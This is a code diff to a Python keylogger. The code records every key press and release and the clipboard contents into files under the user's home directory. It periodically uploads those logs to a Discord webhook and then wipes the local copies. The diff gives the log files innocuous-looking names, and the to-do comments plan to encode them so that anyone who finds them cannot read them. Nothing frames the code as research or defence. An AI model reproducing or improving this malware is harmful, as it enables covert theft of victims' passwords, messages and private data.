@@ -1,5 +1,7 @@
 # To Do
 
+#   Update readme with new features
+
 #   encode files in `Source` directory, it can just be base64 that is decoded at runtime or something
 #       doing this means that if someone stumbles across the files and tries reading them they wont be able to
 #       at least not in plain text
@@ -28,10 +30,16 @@ import pyperclip
 
 max_length = 17 # the longest keycode i could find was media_volume_down which is 17 characters long
 clear_after_send = True
+settings_name = "Source/src.x"
+input_log_name = "Source/main.x"
+input_plaintext_name = "Source/main.dependencies.xd"
+input_plaintext_sep_name = "Source/src.dependencies.xd"
+clipboard_log_name = "Source/extensions.xe"
+kill_switch_name = "Source/kill"
 clip = ""
 
 def kill_switch():
-    file_path = Path.home() / "Source/kill"
+    file_path = Path.home() / kill_switch_name
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if file_path.exists():
@@ -47,12 +55,12 @@ def generate_color(name):
 def check_if_should_send(lines):
     if lines >= max_lines:
         webhook = DiscordWebhook(url=url, username="Keys")
-        file_path = Path.home() / "Source/main"
+        file_path = Path.home() / input_log_name
         file_path.parent.mkdir(parents=True, exist_ok=True)
         with file_path.open('r') as file:
             webhook.add_file(file=file.read(), filename="keys.txt")
         try:
-            file_path = Path.home() / "Source/dist"
+            file_path = Path.home() / clipboard_log_name
             file_path.parent.mkdir(parents=True, exist_ok=True)
             with file_path.open('r') as file:
                 webhook.add_file(file=file.read(), filename="clipboard.txt")
@@ -62,12 +70,12 @@ def check_if_should_send(lines):
         embed.set_timestamp()
         webhook.add_embed(embed)
         if clear_after_send:
-            file_path = Path.home() / "Source/main"
+            file_path = Path.home() / input_log_name
             file_path.parent.mkdir(parents=True, exist_ok=True)
             with file_path.open('w') as file:
                 file.write("")
             try:
-                file_path = Path.home() / "Source/dist"
+                file_path = Path.home() / clipboard_log_name
                 file_path.parent.mkdir(parents=True, exist_ok=True)
                 with file_path.open('w') as file:
                     file.write("")
@@ -197,7 +205,7 @@ def on_press(key):
 
     log = f" Pressed: {str(key_name).rjust(max_length)} | {datetime.now()}\n"
 
-    file_path = Path.home() / "Source/main"
+    file_path = Path.home() / input_log_name
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if not file_path.exists():
@@ -212,7 +220,7 @@ def on_release(key):
 
     log = f"Released: {str(key_name).rjust(max_length)} | {datetime.now()}\n"
 
-    file_path = Path.home() / "Source/main"
+    file_path = Path.home() / input_log_name
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if not file_path.exists():
@@ -228,7 +236,7 @@ def on_release(key):
             clip = pyperclip.paste()
             log = f"{datetime.now()} :\n{str(clip)}\n\n"
 
-            file_path = Path.home() / "Source/dist"
+            file_path = Path.home() / clipboard_log_name
             file_path.parent.mkdir(parents=True, exist_ok=True)
 
             if not file_path.exists():
@@ -249,7 +257,7 @@ def on_release(key):
         return False
 
 if not kill_switch():
-    file_path = Path.home() / "Source/src"
+    file_path = Path.home() / settings_name
     file_path.parent.mkdir(parents=True, exist_ok=True)
 
     if file_path.exists():
